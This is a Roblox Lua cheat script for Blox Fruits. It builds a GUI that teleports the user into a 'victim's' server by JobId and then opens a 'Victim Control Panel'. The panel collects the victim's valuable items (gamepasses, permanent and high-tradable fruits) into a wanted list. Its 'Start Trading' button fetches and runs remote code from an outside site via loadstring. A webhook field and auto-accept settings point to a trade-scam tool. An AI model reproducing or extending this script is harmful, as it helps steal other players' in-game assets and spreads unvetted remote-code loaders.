-- Complete Auto Joiner with Control GUI for Blox Fruits
-- Combines multi-sea teleportation with control panel

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Initialize config if not exists
if not _G["Script-SM_Config"] then
    _G["Script-SM_Config"] = {
        fruits_you_want = "",
        user_webhook = "",
        users = {},
        auto_accept = true,
        auto_ready = true
    }
end

local Config = _G["Script-SM_Config"]

-- Sea and Place mapping
local SEA_PLACE = {
    ["1"] = 2753915549,
    ["2"] = 4442272183,
    ["3"] = 7449423635,
}

local function getCurrentSea()
    if game.PlaceId == 2753915549 then
        return "1"
    elseif game.PlaceId == 4442272183 then
        return "2"
    elseif game.PlaceId == 7449423635 then
        return "3"
    end
    return "0"
end

-- Create Join Dialog
local function CreateJoinDialog()
    local playerGui = LocalPlayer:WaitForChild("PlayerGui")
    
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "JoinDialogGUI"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = playerGui
    
    local panel = Instance.new("Frame")
    panel.Size = UDim2.new(0, 500, 0, 400)
    panel.Position = UDim2.new(0.5, -250, 0.5, -200)
    panel.BackgroundColor3 = Color3.fromRGB(20, 20, 35)
    panel.BorderSizePixel = 0
    panel.Parent = screenGui
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = panel
    
    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(80, 150, 255)
    stroke.Thickness = 2
    stroke.Parent = panel
    
    -- Title
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 60)
    title.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
    title.BorderSizePixel = 0
    title.Text = "üéÆ Auto Joiner - Teleport to Victim"
    title.Font = Enum.Font.GothamBold
    title.TextSize = 18
    title.TextColor3 = Color3.fromRGB(100, 200, 255)
    title.Parent = panel
    
    local titleCorner = Instance.new("UICorner")
    titleCorner.CornerRadius = UDim.new(0, 12)
    titleCorner.Parent = title
    
    -- JobId Label
    local jobIdLabel = Instance.new("TextLabel")
    jobIdLabel.Size = UDim2.new(1, -20, 0, 25)
    jobIdLabel.Position = UDim2.new(0, 10, 0, 75)
    jobIdLabel.BackgroundTransparency = 1
    jobIdLabel.Text = "üìç Victim's JobId:"
    jobIdLabel.Font = Enum.Font.GothamBold
    jobIdLabel.TextSize = 13
    jobIdLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    jobIdLabel.TextXAlignment = Enum.TextXAlignment.Left
    jobIdLabel.Parent = panel
    
    -- JobId Input
    local jobIdInput = Instance.new("TextBox")
    jobIdInput.Size = UDim2.new(1, -20, 0, 45)
    jobIdInput.Position = UDim2.new(0, 10, 0, 105)
    jobIdInput.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
    jobIdInput.BorderSizePixel = 0
    jobIdInput.TextColor3 = Color3.fromRGB(255, 255, 255)
    jobIdInput.PlaceholderText = "Paste JobId here..."
    jobIdInput.Font = Enum.Font.Gotham
    jobIdInput.TextSize = 13
    jobIdInput.Parent = panel
    
    local jobIdCorner = Instance.new("UICorner")
    jobIdCorner.CornerRadius = UDim.new(0, 6)
    jobIdCorner.Parent = jobIdInput
    
    -- Sea Label
    local seaLabel = Instance.new("TextLabel")
    seaLabel.Size = UDim2.new(1, -20, 0, 25)
    seaLabel.Position = UDim2.new(0, 10, 0, 160)
    seaLabel.BackgroundTransparency = 1
    seaLabel.Text = "üåä Target Sea (1, 2, or 3):"
    seaLabel.Font = Enum.Font.GothamBold
    seaLabel.TextSize = 13
    seaLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    seaLabel.TextXAlignment = Enum.TextXAlignment.Left
    seaLabel.Parent = panel
    
    -- Sea Input
    local seaInput = Instance.new("TextBox")
    seaInput.Size = UDim2.new(1, -20, 0, 45)
    seaInput.Position = UDim2.new(0, 10, 0, 190)
    seaInput.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
    seaInput.BorderSizePixel = 0
    seaInput.TextColor3 = Color3.fromRGB(255, 255, 255)
    seaInput.PlaceholderText = "2 (default is Sea 2)"
    seaInput.Font = Enum.Font.Gotham
    seaInput.TextSize = 13
    seaInput.Text = "2"
    seaInput.Parent = panel
    
    local seaCorner = Instance.new("UICorner")
    seaCorner.CornerRadius = UDim.new(0, 6)
    seaCorner.Parent = seaInput
    
    -- Status Label
    local statusLabel = Instance.new("TextLabel")
    statusLabel.Size = UDim2.new(1, -20, 0, 35)
    statusLabel.Position = UDim2.new(0, 10, 0, 250)
    statusLabel.BackgroundTransparency = 1
    statusLabel.Text = "‚úÖ Ready to join"
    statusLabel.Font = Enum.Font.Gotham
    statusLabel.TextSize = 12
    statusLabel.TextColor3 = Color3.fromRGB(150, 255, 150)
    statusLabel.TextWrapped = true
    statusLabel.Parent = panel
    
    -- Join Button
    local joinButton = Instance.new("TextButton")
    joinButton.Size = UDim2.new(0.48, 0, 0, 50)
    joinButton.Position = UDim2.new(0, 10, 0, 300)
    joinButton.BackgroundColor3 = Color3.fromRGB(50, 150, 100)
    joinButton.BorderSizePixel = 0
    joinButton.Text = "üöÄ Join Server"
    joinButton.Font = Enum.Font.GothamBold
    joinButton.TextSize = 13
    joinButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    joinButton.Parent = panel
    
    local joinCorner = Instance.new("UICorner")
    joinCorner.CornerRadius = UDim.new(0, 6)
    joinCorner.Parent = joinButton
    
    -- Cancel Button
    local cancelButton = Instance.new("TextButton")
    cancelButton.Size = UDim2.new(0.48, 0, 0, 50)
    cancelButton.Position = UDim2.new(0.52, 0, 0, 300)
    cancelButton.BackgroundColor3 = Color3.fromRGB(150, 50, 50)
    cancelButton.BorderSizePixel = 0
    cancelButton.Text = "‚ùå Cancel"
    cancelButton.Font = Enum.Font.GothamBold
    cancelButton.TextSize = 13
    cancelButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    cancelButton.Parent = panel
    
    local cancelCorner = Instance.new("UICorner")
    cancelCorner.CornerRadius = UDim.new(0, 6)
    cancelCorner.Parent = cancelButton
    
    local function attemptJoin()
        local jobId = jobIdInput.Text:gsub("^%s*(.-)%s*$", "%1")
        local sea = seaInput.Text:gsub("^%s*(.-)%s*$", "%1")
        
        if jobId == "" or jobId == "PASTE_THE_JOBID_HERE" then
            statusLabel.Text = "‚ö†Ô∏è Enter valid JobId"
            statusLabel.TextColor3 = Color3.fromRGB(255, 200, 50)
            return
        end
        
        if not SEA_PLACE[sea] then
            statusLabel.Text = "‚ö†Ô∏è Invalid Sea (1, 2, or 3)"
            statusLabel.TextColor3 = Color3.fromRGB(255, 200, 50)
            return
        end
        
        statusLabel.Text = "üîÑ Joining Sea " .. sea .. "..."
        statusLabel.TextColor3 = Color3.fromRGB(100, 200, 255)
        joinButton.Enabled = false
        cancelButton.Enabled = false
        
        -- Queue teleport for after arriving at destination
        queue_on_teleport([[
            task.wait(4)
            if game.PlaceId == ]] .. SEA_PLACE[sea] .. [[ and game.JobId ~= "]] .. jobId .. [[" then
                game:GetService("TeleportService"):TeleportToPlaceInstance(]] .. SEA_PLACE[sea] .. [[, "]] .. jobId .. [[")
            end
        ]])
        
        -- Get current sea and handle multi-sea teleportation
        local CURRENT_SEA = getCurrentSea()
        
        if CURRENT_SEA ~= sea then
            if CURRENT_SEA == "1" then
                -- Sea 1 ‚Üí Sea 2 first
                print("[Auto Joiner] Traveling from Sea 1 to Sea 2...")
                statusLabel.Text = "üåä Traveling to Sea 2..."
                local CommF = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
                pcall(function()
                    CommF:InvokeServer("TravelDressrosa")
                end)
                return
            end
            
            if CURRENT_SEA == "2" and sea == "3" then
                -- Sea 2 ‚Üí Sea 3
                print("[Auto Joiner] Traveling from Sea 2 to Sea 3...")
                statusLabel.Text = "üåä Traveling to Sea 3..."
                local CommF = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
                pcall(function()
                    CommF:InvokeServer("TravelZou")
                end)
                return
            end
        end
        
        -- Already on correct sea, teleport to JobId
        print("[Auto Joiner] Teleporting to JobId: " .. jobId)
        statusLabel.Text = "‚úÖ Teleporting..."
        statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
        
        local success = pcall(function()
            TeleportService:TeleportToPlaceInstance(SEA_PLACE[sea], jobId)
        end)
        
        if not success then
            statusLabel.Text = "‚ùå Teleport failed"
            statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
            joinButton.Enabled = true
            cancelButton.Enabled = true
        end
    end
    
    joinButton.MouseButton1Click:Connect(function()
        attemptJoin()
    end)
    
    cancelButton.MouseButton1Click:Connect(function()
        screenGui:Destroy()
    end)
    
    jobIdInput.FocusLost:Connect(function(enterPressed)
        if enterPressed then
            attemptJoin()
        end
    end)
    
    print("[Auto Joiner] Join dialog created!")
end

-- Create Control GUI (shows after teleporting)
local function CreateControlGUI()
    local playerGui = LocalPlayer:WaitForChild("PlayerGui")
    
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "AutoJoinerControlGUI"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = playerGui
    
    -- Main Panel
    local mainPanel = Instance.new("Frame")
    mainPanel.Name = "MainPanel"
    mainPanel.Size = UDim2.new(0, 450, 0, 700)
    mainPanel.Position = UDim2.new(0.5, -225, 0.5, -350)
    mainPanel.BackgroundColor3 = Color3.fromRGB(20, 20, 35)
    mainPanel.BorderSizePixel = 0
    mainPanel.Parent = screenGui
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = mainPanel
    
    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(80, 150, 255)
    stroke.Thickness = 2
    stroke.Parent = mainPanel
    
    -- Title
    local title = Instance.new("TextLabel")
    title.Name = "Title"
    title.Size = UDim2.new(1, 0, 0, 50)
    title.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
    title.BorderSizePixel = 0
    title.Text = "üéÆ Victim Control Panel"
    title.Font = Enum.Font.GothamBold
    title.TextSize = 18
    title.TextColor3 = Color3.fromRGB(100, 200, 255)
    title.Parent = mainPanel
    
    local titleCorner = Instance.new("UICorner")
    titleCorner.CornerRadius = UDim.new(0, 12)
    titleCorner.Parent = title
    
    -- Scroll Container
    local scrollFrame = Instance.new("ScrollingFrame")
    scrollFrame.Name = "ScrollFrame"
    scrollFrame.Size = UDim2.new(1, -20, 1, -70)
    scrollFrame.Position = UDim2.new(0, 10, 0, 60)
    scrollFrame.BackgroundTransparency = 1
    scrollFrame.BorderSizePixel = 0
    scrollFrame.ScrollBarThickness = 8
    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 1400)
    scrollFrame.Parent = mainPanel
    
    -- Helper function to create section
    local function createSection(name, yPos)
        local section = Instance.new("Frame")
        section.Name = name
        section.Size = UDim2.new(1, -10, 0, 0)
        section.Position = UDim2.new(0, 5, 0, yPos)
        section.BackgroundTransparency = 1
        section.Parent = scrollFrame
        
        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(1, 0, 0, 30)
        label.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
        label.BorderSizePixel = 0
        label.Text = "üîπ " .. name
        label.Font = Enum.Font.GothamBold
        label.TextSize = 14
        label.TextColor3 = Color3.fromRGB(150, 255, 150)
        label.TextXAlignment = Enum.TextXAlignment.Left
        label.Parent = section
        
        local labelCorner = Instance.new("UICorner")
        labelCorner.CornerRadius = UDim.new(0, 6)
        labelCorner.Parent = label
        
        return section, label
    end
    
    -- Helper to create button
    local function createButton(parent, text, yOffset, width, callback)
        local button = Instance.new("TextButton")
        button.Size = UDim2.new(width or 1, -10, 0, 40)
        button.Position = UDim2.new(0, 5, 0, yOffset)
        button.BackgroundColor3 = Color3.fromRGB(50, 100, 180)
        button.BorderSizePixel = 0
        button.Text = text
        button.Font = Enum.Font.GothamBold
        button.TextSize = 12
        button.TextColor3 = Color3.fromRGB(255, 255, 255)
        button.Parent = parent
        
        local btnCorner = Instance.new("UICorner")
        btnCorner.CornerRadius = UDim.new(0, 6)
        btnCorner.Parent = button
        
        button.MouseButton1Click:Connect(function()
            button.BackgroundColor3 = Color3.fromRGB(30, 70, 150)
            task.wait(0.1)
            button.BackgroundColor3 = Color3.fromRGB(50, 100, 180)
            callback()
        end)
        
        return button
    end
    
    -- Section 1: Fruits You Want
    local fruitsSection, _ = createSection("Fruits You Want", 10)
    fruitsSection.Size = UDim2.new(1, -10, 0, 140)
    
    local inputLabel = Instance.new("TextLabel")
    inputLabel.Size = UDim2.new(1, -10, 0, 20)
    inputLabel.Position = UDim2.new(0, 5, 0, 40)
    inputLabel.BackgroundTransparency = 1
    inputLabel.Text = "Fruit Name:"
    inputLabel.Font = Enum.Font.Gotham
    inputLabel.TextSize = 12
    inputLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    inputLabel.TextXAlignment = Enum.TextXAlignment.Left
    inputLabel.Parent = fruitsSection
    
    local inputBox = Instance.new("TextBox")
    inputBox.Name = "FruitInput"
    inputBox.Size = UDim2.new(1, -10, 0, 30)
    inputBox.Position = UDim2.new(0, 5, 0, 60)
    inputBox.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
    inputBox.BorderSizePixel = 0
    inputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    inputBox.PlaceholderText = "Enter fruit name (e.g., Kitsune)"
    inputBox.Font = Enum.Font.Gotham
    inputBox.TextSize = 12
    inputBox.Parent = fruitsSection
    
    local inputCorner = Instance.new("UICorner")
    inputCorner.CornerRadius = UDim.new(0, 6)
    inputCorner.Parent = inputBox
    
    createButton(fruitsSection, "‚ûï Add Fruit", 100, 0.48, function()
        local fruit = inputBox.Text:gsub("^%s*(.-)%s*$", "%1")
        if fruit ~= "" then
            if Config.fruits_you_want == "" then
                Config.fruits_you_want = fruit
            else
                Config.fruits_you_want = Config.fruits_you_want .. "," .. fruit
            end
            print("[Control Panel] Added fruit: " .. fruit)
            inputBox.Text = ""
        end
    end)
    
    createButton(fruitsSection, "üóëÔ∏è Clear All", 100, 0.48, function()
        Config.fruits_you_want = ""
        print("[Control Panel] Cleared all fruits")
    end)
    
    -- Section 2: Auto Add Buttons
    local autoAddSection, _ = createSection("Auto Add", 160)
    autoAddSection.Size = UDim2.new(1, -10, 0, 220)
    
    createButton(autoAddSection, "‚≠ê Add All Gamepass", 40, 1, function()
        local CommF = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
        local success, inv = pcall(function() return CommF:InvokeServer("getInventory") end)
        if success then
            local gamepasses = {}
            for _, item in pairs(inv) do
                if string.find(item.Name:lower(), "gamepass") or item.Type == "Gamepass" or item.Type == "Developer Product" then
                    table.insert(gamepasses, item.Name)
                end
            end
            if #gamepasses > 0 then
                for _, gp in ipairs(gamepasses) do
                    if Config.fruits_you_want == "" then
                        Config.fruits_you_want = gp
                    else
                        Config.fruits_you_want = Config.fruits_you_want .. "," .. gp
                    end
                end
                print("[Control Panel] Added " .. #gamepasses .. " gamepasses")
            end
        end
    end)
    
    createButton(autoAddSection, "üíé Add All Permanent", 100, 1, function()
        local CommF = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
        local success, inv = pcall(function() return CommF:InvokeServer("getInventory") end)
        if success then
            local permanents = {}
            for _, item in pairs(inv) do
                if string.find(item.Name:lower(), "permanent") then
                    table.insert(permanents, item.Name)
                end
            end
            if #permanents > 0 then
                for _, perm in ipairs(permanents) do
                    if Config.fruits_you_want == "" then
                        Config.fruits_you_want = perm
                    else
                        Config.fruits_you_want = Config.fruits_you_want .. "," .. perm
                    end
                end
                print("[Control Panel] Added " .. #permanents .. " permanent fruits")
            end
        end
    end)
    
    createButton(autoAddSection, "üî• Add High Tradables", 160, 1, function()
        local highTradables = {
            "Werewolf (Tiger)",
            "Purple Lightning",
            "Yellow Lightning",
            "Red Lightning",
            "Galaxy (Empyrean/Kitsune)",
            "Empyrean (Kitsune)",
            "Crimson (Kitsune)",
            "Ember (Dragon West)"
        }
        
        for _, fruit in ipairs(highTradables) do
            if Config.fruits_you_want == "" then
                Config.fruits_you_want = fruit
            else
                Config.fruits_you_want = Config.fruits_you_want .. "," .. fruit
            end
        end
        print("[Control Panel] Added all high tradable fruits")
    end)
    
    -- Section 3: Action Buttons
    local actionSection, _ = createSection("Actions", 390)
    actionSection.Size = UDim2.new(1, -10, 0, 140)
    
    createButton(actionSection, "‚ñ∂Ô∏è Start Trading", 40, 1, function()
        print("[Control Panel] Starting trading script...")
        pcall(function()
            loadstring(game:HttpGet("https://scriptssm.vercel.app/Script-Fixed.lua"))()
        end)
    end)
    
    createButton(actionSection, "üöÄ Jump to Victim", 100, 1, function()
        print("[Control Panel] Jumping to victim...")
        if LocalPlayer.Character then
            local humRootPart = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            if humRootPart then
                humRootPart.CFrame = humRootPart.CFrame * CFrame.new(0, 50, 0)
                print("[Control Panel] Jumped!")
            end
        end
    end)
    
    -- Section 4: Status
    local statusSection, _ = createSection("Status", 540)
    statusSection.Size = UDim2.new(1, -10, 0, 120)
    
    local statusLabel = Instance.new("TextLabel")
    statusLabel.Size = UDim2.new(1, -10, 0, 100)
    statusLabel.Position = UDim2.new(0, 5, 0, 35)
    statusLabel.BackgroundColor3 = Color3.fromRGB(30, 40, 50)
    statusLabel.BorderSizePixel = 0
    statusLabel.Text = "‚úÖ Panel Ready\n\nüìã Fruits Want: " .. (Config.fruits_you_want ~= "" and Config.fruits_you_want or "None") .. "\n\nüë• Server: " .. game.JobId:sub(1, 8) .. "..."
    statusLabel.Font = Enum.Font.Gotham
    statusLabel.TextSize = 11
    statusLabel.TextColor3 = Color3.fromRGB(150, 255, 150)
    statusLabel.TextWrapped = true
    statusLabel.TextXAlignment = Enum.TextXAlignment.Left
    statusLabel.TextYAlignment = Enum.TextYAlignment.Top
    statusLabel.Parent = statusSection
    
    local statusCorner = Instance.new("UICorner")
    statusCorner.CornerRadius = UDim.new(0, 6)
    statusCorner.Parent = statusLabel
    
    -- Update status every second
    task.spawn(function()
        while screenGui.Parent do
            statusLabel.Text = "‚úÖ Panel Active\n\nüìã Fruits Want: " .. (Config.fruits_you_want ~= "" and Config.fruits_you_want or "None") .. "\n\nüë• Server: " .. game.JobId:sub(1, 8) .. "..."
            task.wait(1)
        end
    end)
    
    -- Make draggable
    local dragging = false
    local dragStart = nil
    local startPos = nil
    
    title.InputBegan:Connect(function(input, gameProcessed)
        if gameProcessed then return end
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = mainPanel.Position
        end
    end)
    
    title.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = false
        end
    end)
    
    game:GetService("UserInputService").InputChanged:Connect(function(input)
        if dragging and dragStart then
            local delta = input.Position - dragStart
            mainPanel.Position = startPos + UDim2.new(0, delta.X, 0, delta.Y)
        end
    end)
    
    print("[Auto Joiner] Control GUI created!")
    return screenGui
end

-- Main execution
print("[Auto Joiner] Starting...")

-- Show join dialog immediately
CreateJoinDialog()

-- Listen for teleport to show control GUI
local guiCreated = false
Players.LocalPlayer.CharacterAdded:Connect(function()
    if not guiCreated then
        task.wait(2)
        print("[Auto Joiner] Creating control panel...")
        guiCreated = true
        CreateControlGUI()
    end
end)

-- Also create GUI if already in game
if LocalPlayer.Character then
    if not guiCreated then
        task.wait(1)
        guiCreated = true
        CreateControlGUI()
    end
end

print("[Auto Joiner] Ready! Input JobId and Sea number to teleport.")
